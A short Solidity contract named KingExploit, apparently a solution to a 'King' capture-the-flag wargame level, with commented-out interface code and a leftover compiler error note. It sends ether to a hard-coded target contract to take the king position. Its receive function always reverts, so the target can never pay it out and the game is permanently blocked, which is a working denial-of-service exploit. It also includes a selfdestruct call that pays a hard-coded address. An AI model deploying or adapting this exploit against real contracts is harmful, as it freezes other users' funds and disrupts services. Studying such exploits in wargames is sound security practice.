// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8;


//interface King {

  //receive() external payable;

//  function _king() external view returns (address payable);
//}

contract KingExploit {
    
    address payable targetContract= payable(0x78F3341Fc2234C7d9bc425981aA0d98d0865E23D);

    receive() external payable {
        revert();
        
    }

    function selfDestruct() public {
        selfdestruct(payable(address(0x737e11E7A11A01891d2cB1b0A07C59A63dcd657C)));
    }

    function proclaimOwnership() public payable{
        //bytes storage smemoryy;
        (bool success,)= targetContract.call{gas: 10000000, value: msg.value}("");
        require(success);
    }


}//TypeError: Type function (bytes memory) payable returns (bool,bytes memory) is not implicitly convertible to expected type tuple(bool,bytes storage ref).
